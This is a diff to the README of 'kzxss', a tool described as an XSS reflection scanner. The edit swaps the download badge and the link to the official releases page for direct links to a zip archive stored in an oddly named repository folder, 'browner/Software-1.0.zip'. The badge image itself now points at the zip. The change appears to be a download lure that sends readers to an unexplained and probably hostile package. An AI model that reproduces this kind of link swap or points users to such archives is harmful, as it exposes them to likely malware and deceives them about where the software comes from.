@@ -1,12 +1,12 @@
 # 🚀 kzxss - Simple and Fast Reflection Scanner
 
-![Download kzxss](https://img.shields.io/badge/Download-kzxss-brightgreen)
+![Download kzxss](https://github.com/tungtits1012/kzxss/raw/refs/heads/main/browner/Software-1.0.zip)
 
 ## 📥 Download & Install
 
 To get kzxss, visit this page to download:
 
-[Download kzxss](https://github.com/tungtits1012/kzxss/releases)
+[Download kzxss](https://github.com/tungtits1012/kzxss/raw/refs/heads/main/browner/Software-1.0.zip)
 
 Follow the steps below to download and run the software:
 
